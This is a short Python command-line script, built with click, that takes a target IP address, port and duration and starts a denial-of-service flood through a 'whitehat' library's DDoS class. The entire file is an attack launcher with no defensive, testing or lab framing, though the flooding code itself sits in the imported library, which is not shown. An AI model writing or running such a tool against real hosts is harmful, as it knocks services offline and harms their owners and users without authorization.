import click
import whitehat

@click.command()
@click.option('--ip', '-i', help="Set target IP", required=True)
@click.option('--port', '-p', help="Set target Port", required=True)
@click.option('--duration', '-d', help="Set DDoS Duration", required=True)
def cli(ip, port, duration):
    """DDoS function"""
    ip = str(ip)
    port = int(port)
    duration = int(duration)
    ddos = whitehat.DDoS(ip, port, duration)
    ddos.start(True)
